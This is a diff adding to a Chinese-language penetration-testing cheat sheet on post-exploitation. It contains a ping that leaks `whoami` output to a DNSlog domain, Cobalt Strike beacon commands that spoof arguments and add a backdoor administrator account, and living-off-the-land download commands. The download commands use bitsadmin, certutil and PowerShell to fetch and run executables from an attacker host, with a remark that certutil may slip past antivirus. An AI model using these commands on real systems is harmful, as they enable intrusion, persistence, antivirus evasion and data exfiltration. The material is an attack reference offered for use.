@@ -208,7 +208,7 @@ netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 
 比如linux,
 ```
-ping `whoami`.soeowh.dnslog.cn
+ ping `whoami`.u9xpbt.dnslog.cn
 ```
 
 
@@ -233,4 +233,44 @@ for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr "TTL="
 ### 常见提权
 
 1. 查看目标服务器上的打的补丁，看看哪些可以使用poc打
+
+
+
+参数污染执行命令
+
+```
+beacon> argue net1 /bypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypass
+beacon> run net1 user what t1!@#1dsdfq3 /add
+beacon> run net1 localgroup administrators what /add
+```
+
+
+# LOL
+
+
+### bitsadmin
+
+系统要求 >= Windows Vista
+bitsadmin /transfer down /download /priority normal "http://www.xxx.com/xxx.exe" "F:\1.exe"
+
+
+### certutil
+
+建议先执行一遍 certutil,再执行下方命令(可能可以绕火绒、360等杀软)
+certutil -urlcache -split -f http://www.xxx.com/xxx.exe 1.exe
+
+
+### powershell
+
+同样,攻击机起http服务
+```powershell-download
+echo $storageDir =$pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://kali-ip/exploit.exe" >>wget.ps1
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+```
+在目标机执行powershell-download中的命令,会生成wget.ps1
+目标机执行:
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 
